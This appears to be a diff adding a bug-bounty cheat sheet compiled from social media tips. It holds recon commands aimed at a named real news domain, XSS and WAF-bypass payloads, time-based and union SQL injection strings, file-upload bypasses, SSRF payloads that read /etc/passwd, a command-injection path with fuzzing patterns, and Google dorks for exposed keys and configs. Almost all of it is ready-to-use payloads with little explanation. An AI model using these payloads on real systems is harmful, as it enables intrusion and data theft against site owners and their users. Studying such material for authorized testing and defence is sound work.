@@ -1,0 +1,107 @@
+curl -s "https://crt.sh/?q=%25.somoynews.tv&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> x.txt 
+curl -s "https://api.hackertarget.com/hostsearch/?q=somoynews.tv" >> xx.txt
+cut -d',' -f1 input.txt > domains.txt
+cut -d',' -f2 input.txt > ips.txt
+cat x.txt | cut -d',' -f1 > domains.txt
+
+
+Here's a quick tip:
+➤ Use "site:*.target.com ext:php"
+➤ And bruteforce URL params
+➤ I found many XSS like this
+
+Payload (URL encoded): ➤ %22%3E%3Cimg%20src=x%20onerror=alert(document.cookies)%3E
+My new favorite WAF bypass: ➤ <Img Src=OnXSS OnError​=confirm("OMNI")>
+SQL Injection - Time Based Payload: 1) AND (SELECT 3493 FROM (SELECT(SLEEP(5)))sauT) AND (3071=3071
+
+
+I injected this payload: ➤ <img/src/onerror​=alert&#xFEFF;(1)>
+
+Finding IDOR:
+1. Intercept API request to list orders
+2. URL decode the request (it had a lot of parameters)
+3. Find sensitive variable (in this case: user_id)
+4. Change the values
+
+Bypass File Upload:
+1. Add a valid extension before the malicious extension : file.png.php, file.jpg.pHp, etc. 
+2. Add special characters at the end of extension : file.php%20, file.php%0a, etc.
+3. Add uppercase letters to extension : .pHp, .phP5, etc. 
+
+
+How to hack APIs? (with BAC)
+
+🔴 What is BAC?
+↳ Broken Access Control is a vulnerability allowing unauthorized users to access restricted resources or functions
+
+🟡 Where To Find?
+↳ Look for admin actions that might be accessible to regular users
+↳ Endpoints with actions like data modification or deletion
+↳ Endpoints that return information specific to a user
+
+🟢 How to Exploit?
+↳ Change user roles in JWT and attempt to access restricted functions
+↳ Modify resource IDs in API requests to access data of other users
+↳ Use lower privilege tokens to access higher privilege endpoints
+
+🔵 Tools to Use:
+↳ Postman: For testing and documenting API requests
+↳ Burp Suite: To intercept and manipulate API traffic
+
+
+
+Guess what? 🚀 I've just uncovered a high-severity SSRF (Server-Side Request Forgery) vulnerability that allowed local file read during PDF generation processes. 📄 This vulnerability posed a serious risk, potentially granting unauthorized access to sensitive files. 💻
+
+Here are some payloads that successfully demonstrated the exploit:
+
+1. <iframe src='file:///etc/passwd' width='600' height='600'>
+2. <embed src='file:///etc/passwd' width='600' height='600'>
+3. <object data='file:///etc/passwd' width='600' height='600' type='text/html'>
+4. <portal src='file:///etc/passwd' id='portal'>
+5. <link rel='attachment' href='file:///etc/passwd'>
+6. <annotation file='/etc/passwd' content='/etc/passwd' icon='Graph' title='Attached File' pos-x='195'>
+7. <​meta http-equiv='refresh' content='0;url=file:///etc/passwd'>
+8. <​script>window.location = "file:///etc/passwd";<​/script>
+9. <img src="x" onerror​="window.location='file:///etc/passwd'">
+10. <link rel="import" href="https://lnkd.in/gsf3JpAK">
+11. <!--hashtag#include file="file:///etc/passwd" -->
+
+
+Sql Injection Payload: '+union all select concat(0x64617461626173653a,1,0x7c76657273696f6e3a,2,0x7c757365723a,md5({{num}})),2,3,4,5,6,7,8-- -
+
+quick RCE 
+
+Target/cgi-bin/dmt/reset.cgi?db_prefix=%26id%26
+
+You can add this paths for ur wordlist 
+
+cgi-bin/dmt/reset.cgi?db_prefix=%26id%26
+
+cgi-bin/reset.cgi?db_prefix=%26id%26
+
+fuzzing as well 
+
+cgi-bin/FUZZ.cgi?FUZZ=%26id%26
+
+by @GodfatherOrwa 
+
+
+
+🚀 Top Google Dorks for Bug Bounty Hunting! 🔍
+
+inurl:admin - Admin pages
+intitle:"Index of" - Directory listings
+filetype:sql - SQL files
+inurl:login - Login pages
+intext:"username" - Exposed user data
+inurl:register - Registration pages
+inurl:reset - Password reset pages
+inurl:admin/login - Admin login
+intitle:"Dashboard" - Admin dashboards
+intext:"confidential" - Sensitive info
+filetype:log - Log files
+intitle:"Error" - Error messages
+filetype:xml - XML files
+inurl:wp-content - WordPress directories
+inurl:config - Configuration files
+intext:"API Key" - Exposed API keys
